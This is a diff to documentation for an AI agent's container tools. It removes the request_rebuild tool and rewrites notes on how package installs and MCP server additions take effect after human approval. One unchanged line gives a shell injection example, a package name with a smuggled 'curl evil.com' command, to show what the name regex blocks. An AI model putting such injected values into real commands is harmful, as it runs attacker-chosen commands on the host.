@@ -16,7 +16,7 @@ install_packages({
 
 - Max 20 packages per request.
 - Names must match strict regex (blocks shell injection via `vim; curl evil.com`).
-- After approval: rebuild runs automatically. You do NOT need to call `request_rebuild` separately.
+- On approval, the image rebuild and container restart happen automatically — there is no separate rebuild step for you to trigger.
 
 ### add_mcp_server
 
@@ -32,15 +32,7 @@ add_mcp_server({
 ```
 
 - Does NOT install packages. Use `install_packages` first if the command isn't already available.
-- On approval, container is killed so the next message wakes it with the new server wired up.
-
-### request_rebuild
-
-Rebuild your container image. Only useful if you've already landed `install_packages` approvals whose rebuild step failed, or if you're recovering from a bad config edit.
-
-```
-request_rebuild({ reason: "previous install_packages rebuild failed" })
-```
+- On approval, the container is killed and the next message wakes it with the new server wired up. No image rebuild — bun runs TS directly.
 
 ### How approval works
 
